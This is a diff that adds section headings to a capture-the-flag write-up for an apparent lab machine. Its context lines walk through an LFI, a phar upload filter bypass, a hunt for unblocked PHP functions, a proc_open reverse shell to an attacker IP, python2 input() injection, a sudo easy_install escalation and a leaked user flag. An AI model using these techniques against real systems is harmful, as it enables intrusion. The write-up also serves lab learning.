@@ -51,7 +51,7 @@ Deny from All
 Allow from env=Required-Header
 ```
 Which is a header to add in the request for the lfi.
-
+# LFI
 There is also mention of a dev vhost (subdomian)
 This page (you have to add the header to see it) is a file upload page.
 
@@ -79,6 +79,7 @@ Using a payload (file.txt) of:
 http://10.10.14.19:9001
 ```
 which works!
+## Filter bypassing
 Next is to try to get code execution. We can use a php phar wrapper. It's like a zip that the phar filter can go into and run files. The cool thing about this is the only check is the magic byte so if it is called pahr_zip.notmalware it will run :)
 
 Just use zip to turn it into a phar file.
@@ -112,6 +113,7 @@ Content-Type: text/html; charset=UTF-8
 <a href="?page=admin">Admin Panel</a>
 hellohttp://10.10.14.19:9001
 ```
+## Dealing with a blacklist
 So there is RCE, which means there is some sort of black/white list. Lets check php info to find disabled functions.
 ```
 pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,pcntl_unshare,error_log,system,exec,shell_exec,popen,passthru,link,symlink,syslog,ld,mail,stream_socket_sendto,dl,stream_socket_client,fsockopen
@@ -132,7 +134,7 @@ phpinfo = ['pcntl_alarm','pcntl_fork','pcntl_waitpid','pcntl_wait','pcntl_wifexi
 print(*[x for x in dangerous_functions if x not in phpinfo]) # lol x in a not b (the venn diagram stuff from way to long ago)
 ```
 seems to not be in the phpinfo file.
-
+## Payload
 Create a rev shell.
 ```php
 <?php
@@ -146,6 +148,8 @@ $proc = proc_open($cmd, $pipe, $pipes);
 ?>
 ```
 Ta da foothold!
+# Priv esc
+## Part 1
 There is a python2 file `/home/developer/dev/siteisup_test.py` which uses input. This can lead to code exec (cause python2 is dumb).
 ```python
 __import__('os').system("bash")
@@ -158,7 +162,7 @@ Now finally user.txt
 ```
 2b720ab6b7c66788c3a9e42a3af7a14c
 ```
-
+## Part 2
 `sudo -l` says easy_install and gtfobins says
 ```
 TF=$(mktemp -d)
